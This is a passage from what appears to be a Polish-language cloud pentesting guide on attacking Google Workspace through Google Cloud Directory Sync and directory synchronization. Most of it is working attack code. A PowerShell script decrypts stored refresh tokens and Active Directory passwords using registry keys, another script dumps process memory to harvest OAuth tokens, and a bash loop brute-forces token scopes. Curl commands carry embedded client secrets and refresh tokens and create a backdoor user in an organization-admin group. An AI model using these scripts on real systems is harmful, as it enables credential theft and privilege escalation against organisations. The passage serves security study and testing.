https://www.googleapis.com/auth/firebase.messaging
https://www.googleapis.com/auth/spreadsheets
https://www.googleapis.com/auth/tasks
https://www.googleapis.com/auth/tasks.readonly
https://www.googleapis.com/auth/userinfo.email
https://www.googleapis.com/auth/userinfo.profile
https://www.google.com/accounts/OAuthLogin
https://www.googleapis.com/auth/account.capabilities
https://www.googleapis.com/auth/accounts.programmaticchallenge
https://www.googleapis.com/auth/accounts.reauth
https://www.googleapis.com/auth/admin.directory.user
https://www.googleapis.com/auth/aida
https://www.googleapis.com/auth/kid.management.privileged
https://www.googleapis.com/auth/android_checkin
https://www.googleapis.com/auth/any-api
https://www.googleapis.com/auth/assistant-sdk-prototype
https://www.googleapis.com/auth/auditrecording-pa
https://www.googleapis.com/auth/bce.secureconnect
https://www.googleapis.com/auth/calendar
https://www.googleapis.com/auth/calendar.events
https://www.googleapis.com/auth/calendar.events.readonly
https://www.googleapis.com/auth/calendar.readonly
https://www.googleapis.com/auth/cast.backdrop
https://www.googleapis.com/auth/cclog
https://www.googleapis.com/auth/chrome-model-execution
https://www.googleapis.com/auth/chrome-optimization-guide
https://www.googleapis.com/auth/chrome-safe-browsing
https://www.googleapis.com/auth/chromekanonymity
https://www.googleapis.com/auth/chromeosdevicemanagement
https://www.googleapis.com/auth/chromesync
https://www.googleapis.com/auth/chromewebstore.readonly
https://www.googleapis.com/auth/classroom.courses.readonly
https://www.googleapis.com/auth/classroom.coursework.me.readonly
https://www.googleapis.com/auth/classroom.coursework.students.readonly
https://www.googleapis.com/auth/classroom.profile.emails
https://www.googleapis.com/auth/classroom.profile.photos
https://www.googleapis.com/auth/classroom.rosters.readonly
https://www.googleapis.com/auth/classroom.student-submissions.me.readonly
https://www.googleapis.com/auth/classroom.student-submissions.students.readonly
https://www.googleapis.com/auth/cloud-translation
https://www.googleapis.com/auth/cloud_search.query
https://www.googleapis.com/auth/cryptauth
https://www.googleapis.com/auth/devstorage.read_write
https://www.googleapis.com/auth/drive
https://www.googleapis.com/auth/drive.apps.readonly
https://www.googleapis.com/auth/drive.file
https://www.googleapis.com/auth/drive.readonly
https://www.googleapis.com/auth/ediscovery
https://www.googleapis.com/auth/experimentsandconfigs
https://www.googleapis.com/auth/firebase.messaging
https://www.googleapis.com/auth/gcm
https://www.googleapis.com/auth/googlenow
https://www.googleapis.com/auth/googletalk
https://www.googleapis.com/auth/identity.passwords.leak.check
https://www.googleapis.com/auth/ip-protection
https://www.googleapis.com/auth/kid.family.readonly
https://www.googleapis.com/auth/kid.management.privileged
https://www.googleapis.com/auth/kid.permission
https://www.googleapis.com/auth/kids.parentapproval
https://www.googleapis.com/auth/kids.supervision.setup.child
https://www.googleapis.com/auth/lens
https://www.googleapis.com/auth/music
https://www.googleapis.com/auth/nearbydevices-pa
https://www.googleapis.com/auth/nearbypresence-pa
https://www.googleapis.com/auth/nearbysharing-pa
https://www.googleapis.com/auth/peopleapi.readonly
https://www.googleapis.com/auth/peopleapi.readwrite
https://www.googleapis.com/auth/photos
https://www.googleapis.com/auth/photos.firstparty.readonly
https://www.googleapis.com/auth/photos.image.readonly
https://www.googleapis.com/auth/profile.language.read
https://www.googleapis.com/auth/secureidentity.action
https://www.googleapis.com/auth/spreadsheets
https://www.googleapis.com/auth/supportcontent
https://www.googleapis.com/auth/tachyon
https://www.googleapis.com/auth/tasks
https://www.googleapis.com/auth/tasks.readonly
https://www.googleapis.com/auth/userinfo.email
https://www.googleapis.com/auth/userinfo.profile
https://www.googleapis.com/auth/wallet.chrome" | tr '\n' ' ')

curl -s --data "client_id=77185425430.apps.googleusercontent.com" \
--data "client_secret=OTJgUOQcT7lO7GsGZq2G4IlT" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03gQU44mwVnU4CDHYE736TGMSNwF-L9IrTuikNFVZQ3sBxshrJaki7QvpHZQMeANHrF0eIPebz0dz0S987354AuSdX38LySlWflI" \
--data "scope=$scope" \
https://www.googleapis.com/oauth2/v4/token
```
</details>

Kilka przyk≈Çad√≥w u≈ºywajƒÖcych niekt√≥rych z tych zakres√≥w:

<details>

<summary>https://www.googleapis.com/auth/userinfo.email &#x26; https://www.googleapis.com/auth/userinfo.profile</summary>
```bash
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/oauth2/v2/userinfo"

{
"id": "100203736939176354570",
"email": "hacktricks@example.com",
"verified_email": true,
"name": "John Smith",
"given_name": "John",
"family_name": "Smith",
"picture": "https://lh3.googleusercontent.com/a/ACg8ocKLvue[REDACTED]wcnzhyKH_p96Gww=s96-c",
"locale": "en",
"hd": "example.com"
}
```
</details>

<details>

<summary>https://www.googleapis.com/auth/admin.directory.user</summary>
```bash
# List users
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/admin/directory/v1/users?customer=<workspace_id>&maxResults=100&orderBy=email"

# Create user
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/json" \
-d '{
"primaryEmail": "newuser@hdomain.com",
"name": {
"givenName": "New",
"familyName": "User"
},
"password": "UserPassword123",
"changePasswordAtNextLogin": true
}' \
"https://www.googleapis.com/admin/directory/v1/users"
```
</details>

<details>

<summary>https://www.googleapis.com/auth/drive</summary>
```bash
# List files
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/drive/v3/files?pageSize=10&fields=files(id,name,modifiedTime)&orderBy=name"
{
"files": [
{
"id": "1Z8m5ALSiHtewoQg1LB8uS9gAIeNOPBrq",
"name": "Veeam new vendor form 1 2024.docx",
"modifiedTime": "2024-08-30T09:25:35.219Z"
}
]
}

# Download file
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/drive/v3/files/<file-id>?alt=media" \
-o "DownloadedFileName.ext"

# Upload file
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/octet-stream" \
--data-binary @path/to/file.ext \
"https://www.googleapis.com/upload/drive/v3/files?uploadType=media"
```
</details>

<details>

<summary>https://www.googleapis.com/auth/devstorage.read_write</summary>
```bash
# List buckets from a project
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/storage/v1/b?project=<project-id>"

# List objects in a bucket
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/storage/v1/b/<bucket-name>/o?maxResults=10&fields=items(id,name,size,updated)&orderBy=name"

# Upload file to bucket
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/octet-stream" \
--data-binary @path/to/yourfile.ext \
"https://www.googleapis.com/upload/storage/v1/b/<BUCKET_NAME>/o?uploadType=media&name=<OBJECT_NAME>"

# Download file from bucket
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/storage/v1/b/BUCKET_NAME/o/OBJECT_NAME?alt=media" \
-o "DownloadedFileName.ext"
```
</details>

<details>

<summary>https://www.googleapis.com/auth/spreadsheets</summary>
```bash
# List spreadsheets
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/drive/v3/files?q=mimeType='application/vnd.google-apps.spreadsheet'&fields=files(id,name,modifiedTime)&pageSize=100"

# Download as pdf
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/drive/v3/files/106VJxeyIsVTkixutwJM1IiJZ0ZQRMiA5mhfe8C5CxMc/export?mimeType=application/pdf" \
-o "Spreadsheet.pdf"

# Create spreadsheet
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/json" \
-d '{
"properties": {
"title": "New Spreadsheet"
}
}' \
"https://sheets.googleapis.com/v4/spreadsheets"

# Read data from a spreadsheet
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://sheets.googleapis.com/v4/spreadsheets/<SPREADSHEET_ID>/values/Sheet1!A1:C10"

# Update data in spreadsheet
curl -X PUT \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/json" \
-d '{
"range": "Sheet1!A2:C2",
"majorDimension": "ROWS",
"values": [
["Alice Johnson", "28", "alice.johnson@example.com"]
]
}' \
"https://sheets.googleapis.com/v4/spreadsheets/<SPREADSHEET_ID>/values/Sheet1!A2:C2?valueInputOption=USER_ENTERED"

# Append data
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/json" \
-d '{
"values": [
["Bob Williams", "35", "bob.williams@example.com"]
]
}' \
"https://sheets.googleapis.com/v4/spreadsheets/SPREADSHEET_ID/values/Sheet1!A:C:append?valueInputOption=USER_ENTERED"
```
</details>

<details>

<summary>https://www.googleapis.com/auth/ediscovery (Google Vault)</summary>

**Google Workspace Vault** to dodatek do Google Workspace, kt√≥ry zapewnia narzƒôdzia do przechowywania danych, wyszukiwania i eksportu danych Twojej organizacji przechowywanych w us≈Çugach Google Workspace, takich jak Gmail, Drive, Chat i inne.

* **Sprawa** w Google Workspace Vault to **pojemnik**, kt√≥ry organizuje i grupuje wszystkie informacje zwiƒÖzane z konkretnym przypadkiem, dochodzeniem lub sprawƒÖ prawnƒÖ. S≈Çu≈ºy jako centralny punkt zarzƒÖdzania **Zatrzymaniami**, **Wyszukiwaniami** i **Eksportami** dotyczƒÖcymi danego zagadnienia.
* **Zatrzymanie** w Google Workspace Vault to **dzia≈Çanie ochronne** stosowane do konkretnych u≈ºytkownik√≥w lub grup w celu **zapobie≈ºenia usuniƒôciu lub zmianie** ich danych w us≈Çugach Google Workspace. Zatrzymania zapewniajƒÖ, ≈ºe istotne informacje pozostajƒÖ nienaruszone i niezmienione przez czas trwania sprawy prawnej lub dochodzenia.
```bash
# List matters
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://vault.googleapis.com/v1/matters?pageSize=10"

# Create matter
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/json" \
-d '{
"name": "Legal Case 2024",
"description": "Matter for the upcoming legal case involving XYZ Corp.",
"state": "OPEN"
}' \
"https://vault.googleapis.com/v1/matters"

# Get specific matter
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://vault.googleapis.com/v1/matters/<MATTER_ID>"

# List holds in a matter
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://vault.googleapis.com/v1/matters/<MATTER_ID>/holds?pageSize=10"
```
Wiƒôcej [punkt√≥w ko≈Ñcowych API w dokumentacji](https://developers.google.com/vault/reference/rest).

</details>

## GCDS - Google Cloud Directory Sync

To narzƒôdzie, kt√≥re mo≈ºna wykorzystaƒá do **synchronizacji u≈ºytkownik√≥w i grup z aktywnego katalogu z Twoim Workspace** (a nie odwrotnie w momencie pisania tego tekstu).

Jest to interesujƒÖce, poniewa≈º jest to narzƒôdzie, kt√≥re bƒôdzie wymagaƒá **po≈õwiadcze≈Ñ superu≈ºytkownika Workspace i uprzywilejowanego u≈ºytkownika AD**. Dlatego mo≈ºe byƒá mo≈ºliwe znalezienie go na serwerze domeny, kt√≥ry synchronizowa≈Çby u≈ºytkownik√≥w od czasu do czasu.

{% hint style="info" %}
Aby przeprowadziƒá **MitM** na binarnym pliku **`config-manager.exe`**, wystarczy dodaƒá nastƒôpujƒÖcƒÖ liniƒô w pliku `config.manager.vmoptions`: **`-Dcom.sun.net.ssl.checkRevocation=false`**
{% endhint %}

{% hint style="success" %}
Zauwa≈º, ≈ºe [**Winpeas**](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe) jest w stanie wykryƒá **GCDS**, uzyskaƒá informacje o konfiguracji i **nawet has≈Ça oraz zaszyfrowane po≈õwiadczenia**.
{% endhint %}

Zauwa≈º r√≥wnie≈º, ≈ºe GCDS nie synchronizuje hase≈Ç z AD do Workspace. Je≈õli ju≈º, to po prostu generuje losowe has≈Ça dla nowo utworzonych u≈ºytkownik√≥w w Workspace, jak mo≈ºna zobaczyƒá na poni≈ºszym obrazku:

<figure><img src="../../.gitbook/assets/telegram-cloud-photo-size-4-5780773316536156543-x.jpg" alt="" width="515"><figcaption></figcaption></figure>

### GCDS - Tokeny dyskowe i po≈õwiadczenia AD

Binarne pliki `config-manager.exe` (g≈Ç√≥wny plik GCDS z GUI) bƒôdƒÖ przechowywaƒá skonfigurowane po≈õwiadczenia Active Directory, token od≈õwie≈ºania i dostƒôp domy≈õlnie w **pliku xml** w folderze **`C:\Program Files\Google Cloud Directory Sync`** w pliku o nazwie **`Untitled-1.xml`** domy≈õlnie. Chocia≈º mo≈ºe byƒá r√≥wnie≈º zapisany w `Dokumentach` u≈ºytkownika lub w **dowolnym innym folderze**.

Ponadto, rejestr **`HKCU\SOFTWARE\JavaSoft\Prefs\com\google\usersyncapp\ui`** wewnƒÖtrz klucza **`open.recent`** zawiera ≈õcie≈ºki do wszystkich niedawno otwartych plik√≥w konfiguracyjnych (xml). Tak wiƒôc mo≈ºliwe jest **sprawdzenie tego, aby je znale≈∫ƒá**.

NajciekawszƒÖ informacjƒÖ w pliku by≈Çoby:
```xml
[...]
<loginMethod>OAUTH2</loginMethod>
<oAuth2RefreshToken>rKvvNQxi74JZGI74u68aC6o+3Nu1ZgVUYdD1GyoWyiHHxtWx+lbx3Nk8dU27fts5lCJKH/Gp1q8S6kEM2AvjQZN16MkGTU+L2Yd0kZsIJWeO0K0RdVaK2D9Saqchk347kDgGsQulJnuxU+Puo46+aA==</oAuth2RefreshToken>
<oAuth2Scopes>
<scope>https://www.google.com/m8/feeds/</scope>
<scope>https://www.googleapis.com/auth/admin.directory.group</scope>
<scope>https://www.googleapis.com/auth/admin.directory.orgunit</scope>
<scope>https://www.googleapis.com/auth/admin.directory.resource.calendar</scope>
<scope>https://www.googleapis.com/auth/admin.directory.user</scope>
<scope>https://www.googleapis.com/auth/admin.directory.userschema</scope>
<scope>https://www.googleapis.com/auth/apps.groups.settings</scope>
<scope>https://www.googleapis.com/auth/apps.licensing</scope>
<scope>https://www.googleapis.com/auth/plus.me</scope>
</oAuth2Scopes>
[...]
<hostname>192.168.10.23</hostname>
<port>389</port>
<basedn>dc=hacktricks,dc=local</basedn>
<authType>SIMPLE</authType>
<authUser>DOMAIN\domain-admin</authUser>
<authCredentialsEncrypted>XMmsPMGxz7nkpChpC7h2ag==</authCredentialsEncrypted>
[...]
```
Zauwa≈º, ≈ºe **token** **od≈õwie≈ºania** i **has≈Ço** u≈ºytkownika sƒÖ **szyfrowane** za pomocƒÖ **AES CBC** z losowo wygenerowanym kluczem i IV przechowywanym w **`HKEY_CURRENT_USER\SOFTWARE\JavaSoft\Prefs\com\google\usersyncapp\util`** (gdziekolwiek biblioteka **`prefs`** Java przechowuje preferencje) w kluczach ciƒÖg√≥w **`/Encryption/Policy/V2.iv`** i **`/Encryption/Policy/V2.key`** przechowywanych w base64.

<details>

<summary>Skrypt Powershell do odszyfrowania tokena od≈õwie≈ºania i has≈Ça</summary>
```powershell
# Paths and key names
$xmlConfigPath = "C:\Users\c\Documents\conf.xml"
$regPath = "SOFTWARE\JavaSoft\Prefs\com\google\usersyncapp\util"
$ivKeyName = "/Encryption/Policy/V2.iv"
$keyKeyName = "/Encryption/Policy/V2.key"

# Open the registry key
try {
$regKey = [Microsoft.Win32.Registry]::CurrentUser.OpenSubKey($regPath)
if (-not $regKey) {
Throw "Registry key not found: HKCU\$regPath"
}
}
catch {
Write-Error "Failed to open registry key: $_"
exit
}

# Get Base64-encoded IV and Key from the registry
try {
$ivBase64 = $regKey.GetValue($ivKeyName)
$ivBase64 = $ivBase64 -replace '/', ''
$ivBase64 = $ivBase64 -replace '\\', '/'
if (-not $ivBase64) {
Throw "IV not found in registry"
}
$keyBase64 = $regKey.GetValue($keyKeyName)
$keyBase64 = $keyBase64 -replace '/', ''
$keyBase64 = $keyBase64 -replace '\\', '/'
if (-not $keyBase64) {
Throw "Key not found in registry"
}
}
catch {
Write-Error "Failed to read registry values: $_"
exit
}
$regKey.Close()


# Decode Base64 IV and Key
$ivBytes = [Convert]::FromBase64String($ivBase64)
$keyBytes = [Convert]::FromBase64String($keyBase64)

# Read XML content
$xmlContent = Get-Content -Path $xmlConfigPath -Raw

# Extract Base64-encoded encrypted values using regex
$refreshTokenMatch = [regex]::Match($xmlContent, "<oAuth2RefreshToken>(.*?)</oAuth2RefreshToken>")
$refreshTokenBase64 = $refreshTokenMatch.Groups[1].Value

$encryptedPasswordMatch = [regex]::Match($xmlContent, "<authCredentialsEncrypted>(.*?)</authCredentialsEncrypted>")
$encryptedPasswordBase64 = $encryptedPasswordMatch.Groups[1].Value

# Decode encrypted values from Base64
$refreshTokenEncryptedBytes = [Convert]::FromBase64String($refreshTokenBase64)
$encryptedPasswordBytes = [Convert]::FromBase64String($encryptedPasswordBase64)

# Function to decrypt data using AES CBC
Function Decrypt-Data($cipherBytes, $keyBytes, $ivBytes) {
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
$aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$aes.KeySize = 256
$aes.BlockSize = 128
$aes.Key = $keyBytes
$aes.IV = $ivBytes

$decryptor = $aes.CreateDecryptor()
$memoryStream = New-Object System.IO.MemoryStream
$cryptoStream = New-Object System.Security.Cryptography.CryptoStream($memoryStream, $decryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)
$cryptoStream.Write($cipherBytes, 0, $cipherBytes.Length)
$cryptoStream.FlushFinalBlock()
$plaintextBytes = $memoryStream.ToArray()

$cryptoStream.Close()
$memoryStream.Close()

return $plaintextBytes
}

# Decrypt the values
$refreshTokenBytes = Decrypt-Data -cipherBytes $refreshTokenEncryptedBytes -keyBytes $keyBytes -ivBytes $ivBytes
$refreshToken = [System.Text.Encoding]::UTF8.GetString($refreshTokenBytes)

$decryptedPasswordBytes = Decrypt-Data -cipherBytes $encryptedPasswordBytes -keyBytes $keyBytes -ivBytes $ivBytes
$decryptedPassword = [System.Text.Encoding]::UTF8.GetString($decryptedPasswordBytes)

# Output the decrypted values
Write-Host "Decrypted Refresh Token: $refreshToken"
Write-Host "Decrypted Password: $decryptedPassword"
```
</details>

{% hint style="info" %}
Zauwa≈º, ≈ºe mo≈ºliwe jest sprawdzenie tych informacji, przeszukujƒÖc kod java **`DirSync.jar`** z **`C:\Program Files\Google Cloud Directory Sync`**, szukajƒÖc ciƒÖgu `exportkeys` (poniewa≈º to jest parametr cli, kt√≥rego oczekuje binarny `upgrade-config.exe`, aby wyeksportowaƒá klucze).
{% endhint %}

Zamiast u≈ºywaƒá skryptu powershell, mo≈ºliwe jest r√≥wnie≈º u≈ºycie binarnego **`:\Program Files\Google Cloud Directory Sync\upgrade-config.exe`** z parametrem `-exportKeys` i uzyskanie **Key** i **IV** z rejestru w formacie hex, a nastƒôpnie u≈ºycie cyberchef z AES/CBC oraz tym kluczem i IV do odszyfrowania informacji.

### GCDS - Zrzut token√≥w z pamiƒôci

Podobnie jak w przypadku GCPW, mo≈ºliwe jest zrzucenie pamiƒôci procesu `config-manager.exe` (to jest nazwa g≈Ç√≥wnego binarnego GCDS z GUI) i bƒôdziesz w stanie znale≈∫ƒá tokeny od≈õwie≈ºania i dostƒôpu (je≈õli zosta≈Çy ju≈º wygenerowane).\
My≈õlƒô, ≈ºe mo≈ºna r√≥wnie≈º znale≈∫ƒá skonfigurowane po≈õwiadczenia AD.

<details>

<summary>Zrzut proces√≥w config-manager.exe i wyszukiwanie token√≥w</summary>
```powershell
# Define paths for Procdump and Strings utilities
$procdumpPath = "C:\Users\carlos_hacktricks\Desktop\SysinternalsSuite\procdump.exe"
$stringsPath = "C:\Users\carlos_hacktricks\Desktop\SysinternalsSuite\strings.exe"
$dumpFolder = "C:\Users\Public\dumps"

# Regular expressions for tokens
$tokenRegexes = @(
"ya29\.[a-zA-Z0-9_\.\-]{50,}",
"1//[a-zA-Z0-9_\.\-]{50,}"
)

# Create a directory for the dumps if it doesn't exist
if (!(Test-Path $dumpFolder)) {
New-Item -Path $dumpFolder -ItemType Directory
}

# Get all Chrome process IDs
$chromeProcesses = Get-Process -Name "config-manager" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Id

# Dump each Chrome process
foreach ($processId in $chromeProcesses) {
Write-Output "Dumping process with PID: $processId"
& $procdumpPath -accepteula -ma $processId "$dumpFolder\chrome_$processId.dmp"
}

# Extract strings and search for tokens in each dump
Get-ChildItem $dumpFolder -Filter "*.dmp" | ForEach-Object {
$dumpFile = $_.FullName
$baseName = $_.BaseName
$asciiStringsFile = "$dumpFolder\${baseName}_ascii_strings.txt"
$unicodeStringsFile = "$dumpFolder\${baseName}_unicode_strings.txt"

Write-Output "Extracting strings from $dumpFile"
& $stringsPath -accepteula -n 50 -nobanner $dumpFile > $asciiStringsFile
& $stringsPath -accepteula -n 50 -nobanner -u $dumpFile > $unicodeStringsFile

$outputFiles = @($asciiStringsFile, $unicodeStringsFile)

foreach ($file in $outputFiles) {
foreach ($regex in $tokenRegexes) {

$matches = Select-String -Path $file -Pattern $regex -AllMatches

$uniqueMatches = @{}

foreach ($matchInfo in $matches) {
foreach ($match in $matchInfo.Matches) {
$matchValue = $match.Value
if (-not $uniqueMatches.ContainsKey($matchValue)) {
$uniqueMatches[$matchValue] = @{
LineNumber = $matchInfo.LineNumber
LineText   = $matchInfo.Line.Trim()
FilePath   = $matchInfo.Path
}
}
}
}

foreach ($matchValue in $uniqueMatches.Keys) {
$info = $uniqueMatches[$matchValue]
Write-Output "Match found in file '$($info.FilePath)' on line $($info.LineNumber): $($info.LineText)"
}
}

Write-Output ""
}
}

Remove-Item -Path $dumpFolder -Recurse -Force
```
</details>

### GCDS - Generowanie token√≥w dostƒôpu z token√≥w od≈õwie≈ºajƒÖcych

U≈ºywajƒÖc tokena od≈õwie≈ºajƒÖcego, mo≈ºliwe jest generowanie token√≥w dostƒôpu przy u≈ºyciu tego tokena oraz identyfikatora klienta i tajnego klucza klienta okre≈õlonych w nastƒôpujƒÖcym poleceniu:
```bash
curl -s --data "client_id=118556098869.apps.googleusercontent.com" \
--data "client_secret=Co-LoSjkPcQXD9EjJzWQcgpy" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03gQU44mwVnU4CDHYE736TGMSNwF-L9IrTuikNFVZQ3sBxshrJaki7QvpHZQMeANHrF0eIPebz0dz0S987354AuSdX38LySlWflI" \
https://www.googleapis.com/oauth2/v4/token
```
### GCDS - Zakresy

{% hint style="info" %}
Zauwa≈º, ≈ºe nawet posiadajƒÖc token od≈õwie≈ºajƒÖcy, nie mo≈ºna ≈ºƒÖdaƒá ≈ºadnego zakresu dla tokena dostƒôpu, poniewa≈º mo≈ºna ≈ºƒÖdaƒá tylko **zakres√≥w obs≈Çugiwanych przez aplikacjƒô, w kt√≥rej generujesz token dostƒôpu**.

Ponadto, token od≈õwie≈ºajƒÖcy nie jest wa≈ºny w ka≈ºdej aplikacji.
{% endhint %}

Domy≈õlnie GCSD nie bƒôdzie mia≈Ç dostƒôpu jako u≈ºytkownik do ka≈ºdego mo≈ºliwego zakresu OAuth, wiƒôc u≈ºywajƒÖc poni≈ºszego skryptu mo≈ºemy znale≈∫ƒá zakresy, kt√≥re mo≈ºna wykorzystaƒá z `refresh_token`, aby wygenerowaƒá `access_token`:

<details>

<summary>Skrypt Bash do brute-force zakres√≥w</summary>
```bash
curl "https://developers.google.com/identity/protocols/oauth2/scopes" | grep -oE 'https://www.googleapis.com/auth/[a-zA-Z/\._\-]*' | sort -u | while read -r scope; do
echo -ne "Testing $scope           \r"
if ! curl -s --data "client_id=118556098869.apps.googleusercontent.com" \
--data "client_secret=Co-LoSjkPcQXD9EjJzWQcgpy" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03PR0VQOSCjS1CgYIARAAGAMSNwF-L9Ir5b_vOaCmnXzla0nL7dX7TJJwFcvrfgDPWI-j19Z4luLpYfLyv7miQyvgyXjGEXt-t0A" \
--data "scope=$scope" \
https://www.googleapis.com/oauth2/v4/token 2>&1 | grep -q "error_description"; then
echo ""
echo $scope
echo $scope >> /tmp/valid_scopes.txt
fi
done

echo ""
echo ""
echo "Valid scopes:"
cat /tmp/valid_scopes.txt
rm /tmp/valid_scopes.txt
```
</details>

A oto wynik, kt√≥ry otrzyma≈Çem w momencie pisania:
```
https://www.googleapis.com/auth/admin.directory.group
https://www.googleapis.com/auth/admin.directory.orgunit
https://www.googleapis.com/auth/admin.directory.resource.calendar
https://www.googleapis.com/auth/admin.directory.user
https://www.googleapis.com/auth/admin.directory.userschema
https://www.googleapis.com/auth/apps.groups.settings
https://www.googleapis.com/auth/apps.licensing
https://www.googleapis.com/auth/contacts
```
#### Utw√≥rz u≈ºytkownika i dodaj go do grupy `gcp-organization-admins`, aby spr√≥bowaƒá eskalowaƒá uprawnienia w GCP
```bash
# Create new user
curl -X POST \
'https://admin.googleapis.com/admin/directory/v1/users' \
-H 'Authorization: Bearer <ACCESS_TOKEN>' \
-H 'Content-Type: application/json' \
-d '{
"primaryEmail": "deleteme@domain.com",
"name": {
"givenName": "Delete",
"familyName": "Me"
},
"password": "P4ssw0rdStr0ng!",
"changePasswordAtNextLogin": false
}'

# Add to group
curl -X POST \
'https://admin.googleapis.com/admin/directory/v1/groups/gcp-organization-admins@domain.com/members' \
-H 'Authorization: Bearer <ACCESS_TOKEN>' \
-H 'Content-Type: application/json' \
-d '{
"email": "deleteme@domain.com",
"role": "OWNER"
}'

# You could also change the password of a user for example
```
{% hint style="danger" %}
Nie mo≈ºna nadaƒá nowemu u≈ºytkownikowi roli Super Admin, poniewa≈º **token od≈õwie≈ºania nie ma wystarczajƒÖcych zakres√≥w** do nadania wymaganych uprawnie≈Ñ.
{% endhint %}

## Synchronizacja katalogu administratora

G≈Ç√≥wna r√≥≈ºnica miƒôdzy tym sposobem synchronizacji u≈ºytkownik√≥w z GCDS polega na tym, ≈ºe GCDS jest realizowane rƒôcznie za pomocƒÖ niekt√≥rych binari√≥w, kt√≥re musisz pobraƒá i uruchomiƒá, podczas gdy **Synchronizacja katalogu administratora jest bezserwerowa** i zarzƒÖdzana przez Google w [https://admin.google.com/ac/sync/externaldirectories](https://admin.google.com/ac/sync/externaldirectories).

W momencie pisania tego tekstu us≈Çuga ta jest w wersji beta i obs≈Çuguje 2 typy synchronizacji: Z **Active Directory** i z **Azure Entra ID:**

* **Active Directory:** Aby to skonfigurowaƒá, musisz **daƒá Google dostƒôp do swojego ≈õrodowiska Active Directory**. A poniewa≈º Google ma dostƒôp tylko do sieci GCP (za po≈õrednictwem **VPC connectors**), musisz utworzyƒá konektor, a nastƒôpnie udostƒôpniƒá swoje AD z tego konektora, umieszczajƒÖc je w VM w sieci GCP lub u≈ºywajƒÖc Cloud VPN lub Cloud Interconnect. Nastƒôpnie musisz r√≥wnie≈º dostarczyƒá **po≈õwiadczenia** konta z dostƒôpem do odczytu w katalogu oraz **certyfikat** do kontaktu za po≈õrednictwem **LDAPS**.
* **Azure Entra ID:** Aby to skonfigurowaƒá, wystarczy **zalogowaƒá siƒô do Azure za pomocƒÖ u≈ºytkownika z dostƒôpem do odczytu** w subskrypcji Entra ID w oknie pop-up wy≈õwietlanym przez Google, a Google zachowa token z dostƒôpem do odczytu w Entra ID.

Po poprawnej konfiguracji obie opcje pozwolƒÖ na **synchronizacjƒô u≈ºytkownik√≥w i grup z Workspace**, ale nie pozwolƒÖ na konfigurowanie u≈ºytkownik√≥w i grup z Workspace do AD lub EntraID.

Inne opcje, kt√≥re bƒôdƒÖ dostƒôpne podczas tej synchronizacji, to:

* Wys≈Çanie e-maila do nowych u≈ºytkownik√≥w w celu zalogowania siƒô
* Automatyczna zmiana ich adresu e-mail na ten u≈ºywany przez Workspace. Je≈õli wiƒôc Workspace u≈ºywa `@hacktricks.xyz`, a u≈ºytkownicy EntraID u≈ºywajƒÖ `@carloshacktricks.onmicrosoft.com`, to `@hacktricks.xyz` bƒôdzie u≈ºywane dla u≈ºytkownik√≥w utworzonych w koncie.
* Wyb√≥r **grup zawierajƒÖcych u≈ºytkownik√≥w**, kt√≥re bƒôdƒÖ synchronizowane.
* Wyb√≥r **grup** do synchronizacji i utworzenia w Workspace (lub wskazanie synchronizacji wszystkich grup).

### Z AD/EntraID -> Google Workspace (& GCP)

Je≈õli uda ci siƒô skompromitowaƒá AD lub EntraID, bƒôdziesz mia≈Ç pe≈ÇnƒÖ kontrolƒô nad u≈ºytkownikami i grupami, kt√≥re bƒôdƒÖ synchronizowane z Google Workspace.\
Jednak zauwa≈º, ≈ºe **has≈Ça**, kt√≥re u≈ºytkownicy mogƒÖ u≈ºywaƒá w Workspace, **mogƒÖ byƒá takie same lub nie**.

#### Atakowanie u≈ºytkownik√≥w

Gdy synchronizacja nastƒôpuje, mo≈ºe synchronizowaƒá **wszystkich u≈ºytkownik√≥w z AD lub tylko tych z konkretnego OU** lub tylko **u≈ºytkownik√≥w bƒôdƒÖcych cz≈Çonkami konkretnych grup w EntraID**. Oznacza to, ≈ºe aby zaatakowaƒá zsynchronizowanego u≈ºytkownika (lub utworzyƒá nowego, kt√≥ry zostanie zsynchronizowany), musisz najpierw ustaliƒá, kt√≥rzy u≈ºytkownicy sƒÖ synchronizowani.

* U≈ºytkownicy mogƒÖ **ponownie u≈ºywaƒá has≈Ça lub nie z AD lub EntraID**, ale oznacza to, ≈ºe musisz **skompromitowaƒá has≈Ça u≈ºytkownik√≥w, aby siƒô zalogowaƒá**.
* Je≈õli masz dostƒôp do **maili** u≈ºytkownik√≥w, mo≈ºesz **zmieniƒá has≈Ço Workspace istniejƒÖcego u≈ºytkownika**, lub **utworzyƒá nowego u≈ºytkownika**, poczekaƒá, a≈º zostanie zsynchronizowany i skonfigurowaƒá konto.

Gdy uzyskasz dostƒôp do u≈ºytkownika w Workspace, mogƒÖ mu byƒá nadane pewne **uprawnienia domy≈õlne**.

#### Atakowanie grup

